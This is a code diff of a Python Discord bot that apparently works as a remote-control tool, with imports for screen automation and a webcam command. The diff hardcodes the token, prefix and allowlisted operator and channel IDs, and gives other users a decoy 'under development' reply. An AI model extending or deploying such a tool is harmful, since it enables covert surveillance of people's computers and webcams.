@@ -1,3 +1,5 @@
+
+
 import functools
 import getpass
 import os
@@ -22,9 +24,17 @@ import pyautogui
 import requests
 from discord.ext import commands
 
-from src.database.manager import main as db_main
+TOKEN = open("token.txt", "r").read()
+PREFIX = ">"
+USERS = [
+    584662127470575616
+]
+CHANNELS = [
+    861861096512290836
+]
 
-client = commands.Bot(command_prefix=db_main.prefix)
+
+client = commands.Bot(command_prefix=PREFIX)
 
 
 @client.command()
@@ -81,12 +91,12 @@ async def on_message(message):
         return
 
     # Process commands only if in correct channel and requested by possible users
-    if (message.channel.id in db_main.channel_ids) and (message.author.id in db_main.users):
+    if (message.channel.id in CHANNELS) and (message.author.id in USERS):
         await client.process_commands(message)
 
     else:
         # dummy message for other users
-        if message.content.lower().startswith(db_main.prefix):
+        if message.content.lower().startswith(PREFIX):
             await message.reply("This bot is still under development. Stay tuned! Thank you.")
             return
 
@@ -1168,4 +1178,4 @@ async def webcam(ctx):
         await ctx.send(str(e))
 
 if __name__ == "__main__":
-    client.run(db_main.token)
+    client.run(TOKEN)
